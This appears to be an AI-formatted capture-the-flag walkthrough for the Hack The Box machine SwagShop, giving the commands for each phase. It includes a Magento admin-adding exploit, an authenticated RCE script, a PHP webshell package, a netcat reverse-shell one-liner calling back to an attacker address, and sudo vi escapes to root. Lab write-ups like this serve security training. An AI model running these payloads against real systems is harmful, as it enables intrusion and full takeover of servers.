Here’s a **clean, Markdown-formatted command walkthrough** for **HTB: SwagShop**, organized by phase and including explanatory context:

---

# 🧢 HTB: SwagShop – Command Walkthrough

## 📋 Box Info
- **IP**: `10.10.10.140`
- **OS**: Ubuntu 16.04 (Xenial)
- **Difficulty**: Easy
- **Initial Access**: Magento authentication bypass + RCE
- **Privilege Escalation**: `sudo vi` file escape

---

## 🔍 Recon

### 🔎 Full Port Scan
```bash
nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.140
```

### 🔎 Script & Version Scan
```bash
nmap -sC -sV -p 80,22 -oA scans/nmap-scripts 10.10.10.140
```

---

## 📂 Web Enumeration

### 🔍 Directory Brute Force
```bash
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50 -o scans/gobuster-root -u http://10.10.10.140/
```

---

## 🐚 Shell as www-data

### 👤 Add Admin via Shoplift Exploit
```bash
python poc.py 10.10.10.140
# Result: ypwq:123 added as admin
```

### 🔓 Login to Admin Panel
Navigate to:
```
http://10.10.10.140/index.php/admin
```

### 🧪 RCE #1 – PHP Object Injection

#### 📦 Retrieve Magento Install Date
```bash
curl -s http://10.10.10.140/app/etc/local.xml | grep date
```

#### 💣 Download Authenticated RCE Exploit
```bash
searchsploit -m exploits/php/webapps/37811.py
mv 37811.py magento_rce.py
```

#### ⚙️ Configure Exploit
Edit `magento_rce.py`:
```python
username = 'ypwq'
password = '123'
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'
```

#### ▶️ Execute Command
```bash
python magento_rce.py 'http://10.10.10.140/index.php/admin' "uname -a"
```

### 🧪 RCE #2 – Malicious Magento Package *(legacy method, may be patched)*

#### 📦 Create Package
```bash
mkdir -p errors
echo '<?php system($_REQUEST["cmd"]); ?>' > errors/cmd.php
md5sum errors/cmd.php  # Save the hash

# Create package.xml with correct structure and hash
# Then:
tar -czvf package.tgz errors/ package.xml
```

#### ⬆️ Upload Package
Navigate to:
```
http://10.10.10.140/downloader/
```

#### 🕸️ Execute Command via Webshell
```bash
curl http://10.10.10.140/errors/cmd.php?cmd=id
```

---

## ⚡ Get Reverse Shell

### 🧬 Reverse Shell Payload
```bash
python magento_rce.py 'http://10.10.10.140/index.php/admin' \
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f"
```

### 📡 Catch Shell
```bash
nc -lnvp 9001
```

---

## 🔼 Privilege Escalation (www-data → root)

### 📟 Upgrade Shell
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo
fg
reset
# Enter: screen
export TERM=screen
```

### 🔍 Check Sudo Permissions
```bash
sudo -l
```

> Output:
```
(root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

---

## 👑 Root Access

### 📖 Read Flag via `vi`
```bash
sudo /usr/bin/vi /var/www/html/../../../root/root.txt
```

### 🐚 Get Root Shell via vi
```bash
sudo /usr/bin/vi /var/www/html/a

# Inside vi:
:set shell=/bin/bash
:shell
```

Or run directly from command line:
```bash
sudo vi /var/www/html/a -c ':!/bin/sh'
```

---

Let me know if you'd like this saved as a reusable template or combined with your other write-ups!